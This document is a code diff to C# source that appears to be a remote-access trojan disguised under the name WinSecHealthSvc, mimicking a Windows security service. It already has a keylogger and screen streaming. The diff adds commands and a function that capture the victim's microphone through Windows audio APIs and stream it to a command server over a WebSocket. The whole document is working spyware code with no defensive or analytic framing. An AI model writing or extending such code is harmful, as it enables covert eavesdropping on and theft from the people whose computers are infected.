@@ -251,6 +251,7 @@ namespace WinSecHealthSvc
         // ---- State ----
         static bool _running = true;
         static bool _screenStreaming = false;
+        static bool _audioStreaming = false;
         static bool _keylogRunning = false;
         static StringBuilder _keylog = new StringBuilder();
 
@@ -521,6 +522,13 @@ namespace WinSecHealthSvc
                         break;
                     case "screen_stop":
                         _screenStreaming = false; output = "Stream stopped";
+                        break;
+                    case "audio_start":
+                        if (!_audioStreaming) { _audioStreaming = true; new Thread(AudioStreamLoop) { IsBackground = true }.Start(); output = "Audio stream started"; }
+                        else output = "Already streaming audio";
+                        break;
+                    case "audio_stop":
+                        _audioStreaming = false; output = "Audio stream stopped";
                         break;
                     case "keylogger":
                     case "keylog_start":
@@ -810,6 +818,64 @@ namespace WinSecHealthSvc
                 await Task.Delay(Math.Max(5, 33 - (int)sw.ElapsedMilliseconds));
             }
             try { await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "", CancellationToken.None); } catch {}
+        }
+
+        static async void AudioStreamLoop() {
+            var ws = new ClientWebSocket();
+            try {
+                string wsUrl = _server.Replace("http", "ws") + "/api/agent/stream_ws?id=" + _clientId;
+                await ws.ConnectAsync(new Uri(wsUrl), CancellationToken.None);
+            } catch { return; }
+
+            IMMDeviceEnumerator enumerator = null;
+            IMMDevice device = null;
+            IAudioClient client = null;
+            IAudioCaptureClient capture = null;
+
+            try {
+                enumerator = (IMMDeviceEnumerator)Activator.CreateInstance(Type.GetTypeFromCLSID(new Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")));
+                enumerator.GetDefaultAudioEndpoint(1, 1, out device);
+                
+                Guid iidClient = new Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2");
+                object obj;
+                device.Activate(iidClient, 23, IntPtr.Zero, out obj);
+                client = (IAudioClient)obj;
+
+                var fmt = new WAVEFORMATEX { wFormatTag = 1, nChannels = 1, nSamplesPerSec = 16000, wBitsPerSample = 16, nBlockAlign = 2, nAvgBytesPerSec = 32000, cbSize = 0 };
+                IntPtr pFmt = Marshal.AllocHGlobal(Marshal.SizeOf(fmt));
+                Marshal.StructureToPtr(fmt, pFmt, false);
+                client.Initialize(0, 0, 1000000, 0, pFmt, Guid.Empty);
+                
+                Guid iidCapture = new Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317");
+                client.GetService(iidCapture, out obj);
+                capture = (IAudioCaptureClient)obj;
+                client.Start();
+
+                while (_audioStreaming && ws.State == WebSocketState.Open) {
+                    uint packetSize;
+                    capture.GetNextPacketSize(out packetSize);
+                    while (packetSize > 0) {
+                        IntPtr dataPtr;
+                        uint numFrames, flags;
+                        ulong devPos, qpcPos;
+                        capture.GetBuffer(out dataPtr, out numFrames, out flags, out devPos, out qpcPos);
+                        int byteLen = (int)numFrames * 2;
+                        if (byteLen > 0) {
+                            byte[] raw = new byte[byteLen + 1];
+                            raw[0] = 0x03;
+                            Marshal.Copy(dataPtr, raw, 1, byteLen);
+                            await ws.SendAsync(new ArraySegment<byte>(raw), WebSocketMessageType.Binary, true, CancellationToken.None);
+                        }
+                        capture.ReleaseBuffer(numFrames);
+                        capture.GetNextPacketSize(out packetSize);
+                    }
+                    Thread.Sleep(10);
+                }
+            } catch (Exception ex) { Log("Audio error: " + ex.Message); }
+            finally {
+                if (client != null) client.Stop();
+                try { await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "", CancellationToken.None); } catch {}
+            }
         }
 
         static void KeyloggerStreamer() {
